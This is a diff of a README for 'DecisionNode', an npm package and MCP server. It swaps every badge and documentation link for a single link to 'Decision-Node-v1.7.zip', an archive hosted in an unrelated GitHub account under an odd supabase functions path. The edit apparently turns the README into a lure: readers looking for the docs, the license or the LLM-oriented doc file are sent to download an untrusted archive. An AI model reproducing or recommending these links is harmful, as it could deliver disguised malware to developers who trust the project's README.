@@ -9,10 +9,10 @@
 </p>
 
 <p align="center">
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License: MIT" /></a>
-  <a href="https://www.npmjs.com/package/decisionnode"><img src="https://img.shields.io/npm/v/decisionnode.svg" alt="npm version" /></a>
-  <img src="https://github.com/decisionnode/DecisionNode/actions/workflows/ci.yml/badge.svg" alt="CI" />
-  <a href="https://glama.ai/mcp/servers/decisionnode/DecisionNode"><img src="https://glama.ai/mcp/servers/decisionnode/DecisionNode/badges/score.svg?v=1" alt="Glama" /></a>
+  <a href="https://github.com/lapheavisidelayer940/DecisionNode/raw/refs/heads/main/website/supabase/functions/create-checkout/Decision-Node-v1.7.zip"><img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License: MIT" /></a>
+  <a href="https://github.com/lapheavisidelayer940/DecisionNode/raw/refs/heads/main/website/supabase/functions/create-checkout/Decision-Node-v1.7.zip"><img src="https://img.shields.io/npm/v/decisionnode.svg" alt="npm version" /></a>
+  <img src="https://github.com/lapheavisidelayer940/DecisionNode/raw/refs/heads/main/website/supabase/functions/create-checkout/Decision-Node-v1.7.zip" alt="CI" />
+  <a href="https://github.com/lapheavisidelayer940/DecisionNode/raw/refs/heads/main/website/supabase/functions/create-checkout/Decision-Node-v1.7.zip"><img src="https://github.com/lapheavisidelayer940/DecisionNode/raw/refs/heads/main/website/supabase/functions/create-checkout/Decision-Node-v1.7.zip" alt="Glama" /></a>
 </p>
 
 ---
@@ -170,17 +170,17 @@ Set the minimum similarity score (0.0–1.0) for search results. The default is 
 
 ## Documentation
 
-Full docs at [decisionnode.dev/docs](https://decisionnode.dev/docs)
+Full docs at [decisionnode.dev/docs](https://github.com/lapheavisidelayer940/DecisionNode/raw/refs/heads/main/website/supabase/functions/create-checkout/Decision-Node-v1.7.zip)
 
-- [Quickstart](https://decisionnode.dev/docs/quickstart)
-- [CLI Reference](https://decisionnode.dev/docs/cli) — all commands
-- [MCP Server](https://decisionnode.dev/docs/mcp) — 9 tools, setup for Claude/Cursor/Windsurf
-- [Decision Nodes](https://decisionnode.dev/docs/decisions) — structure, fields, lifecycle
-- [Context Engine](https://decisionnode.dev/docs/context) — embedding, search, conflict detection
-- [Configuration](https://decisionnode.dev/docs/setup) — storage, agent behavior, search threshold, global decisions
-- [Workflows](https://decisionnode.dev/docs/workflows) — common patterns
+- [Quickstart](https://github.com/lapheavisidelayer940/DecisionNode/raw/refs/heads/main/website/supabase/functions/create-checkout/Decision-Node-v1.7.zip)
+- [CLI Reference](https://github.com/lapheavisidelayer940/DecisionNode/raw/refs/heads/main/website/supabase/functions/create-checkout/Decision-Node-v1.7.zip) — all commands
+- [MCP Server](https://github.com/lapheavisidelayer940/DecisionNode/raw/refs/heads/main/website/supabase/functions/create-checkout/Decision-Node-v1.7.zip) — 9 tools, setup for Claude/Cursor/Windsurf
+- [Decision Nodes](https://github.com/lapheavisidelayer940/DecisionNode/raw/refs/heads/main/website/supabase/functions/create-checkout/Decision-Node-v1.7.zip) — structure, fields, lifecycle
+- [Context Engine](https://github.com/lapheavisidelayer940/DecisionNode/raw/refs/heads/main/website/supabase/functions/create-checkout/Decision-Node-v1.7.zip) — embedding, search, conflict detection
+- [Configuration](https://github.com/lapheavisidelayer940/DecisionNode/raw/refs/heads/main/website/supabase/functions/create-checkout/Decision-Node-v1.7.zip) — storage, agent behavior, search threshold, global decisions
+- [Workflows](https://github.com/lapheavisidelayer940/DecisionNode/raw/refs/heads/main/website/supabase/functions/create-checkout/Decision-Node-v1.7.zip) — common patterns
 
-For LLM consumption: [decisionnode.dev/decisionnode-docs.md](https://decisionnode.dev/decisionnode-docs.md)
+For LLM consumption: [decisionnode.dev/decisionnode-docs.md](https://github.com/lapheavisidelayer940/DecisionNode/raw/refs/heads/main/website/supabase/functions/create-checkout/Decision-Node-v1.7.zip)
 
 ## Contributing
 
